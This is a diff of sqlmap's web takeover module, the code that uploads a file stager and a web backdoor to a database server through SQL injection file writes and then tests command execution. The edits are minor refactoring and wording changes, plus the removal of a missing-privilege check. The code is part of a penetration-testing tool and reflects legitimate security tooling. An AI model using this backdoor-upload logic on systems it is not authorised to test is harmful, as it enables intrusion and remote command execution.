@@ -41,12 +41,10 @@ from lib.core.enums import DBMS
 from lib.core.enums import OS
 from lib.core.enums import PAYLOAD
 from lib.core.enums import WEB_API
-from lib.core.exception import SqlmapNoneDataException
 from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
 from lib.core.settings import EVENTVALIDATION_REGEX
 from lib.core.settings import VIEWSTATE_REGEX
 from lib.request.connect import Connect as Request
-from thirdparty.oset.pyoset import oset
 
 
 class Web:
@@ -198,7 +196,7 @@ class Web:
 
         directories = list(arrayizeValue(getManualDirectories()))
         directories.extend(getAutoDirectories())
-        directories = list(oset(directories))
+        directories = sorted(set(directories))
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
         backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
@@ -221,9 +219,9 @@ class Web:
             else:
                 directory = directory[2:] if isWindowsDriveLetterPath(directory) else directory
 
-            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method
+            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE technique
             infoMsg = "trying to upload the file stager on '%s' " % directory
-            infoMsg += "via LIMIT 'LINES TERMINATED BY' method"
+            infoMsg += "via LIMIT 'LINES TERMINATED BY' technique"
             logger.info(infoMsg)
             self._webFileInject(stagerContent, stagerName, directory)
 
@@ -240,7 +238,7 @@ class Web:
                     uploaded = True
                     break
 
-            # Fall-back to UNION queries file upload method
+            # Fall-back to UNION queries file upload technique
             if not uploaded:
                 warnMsg = "unable to upload the file stager "
                 warnMsg += "on '%s'" % directory
@@ -248,7 +246,7 @@ class Web:
 
                 if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                     infoMsg = "trying to upload the file stager on '%s' " % directory
-                    infoMsg += "via UNION method"
+                    infoMsg += "via UNION technique"
                     logger.info(infoMsg)
 
                     handle, filename = mkstemp()
@@ -348,11 +346,7 @@ class Web:
             testStr = "command execution test"
             output = self.webBackdoorRunCmd("echo %s" % testStr)
 
-            if output == "0":
-                warnMsg = "the backdoor has been uploaded but required privileges "
-                warnMsg += "for running the system commands are missing"
-                raise SqlmapNoneDataException(warnMsg)
-            elif output and testStr in output:
+            if output and testStr in output:
                 infoMsg = "the backdoor has been successfully "
             else:
                 infoMsg = "the backdoor has probably been successfully "
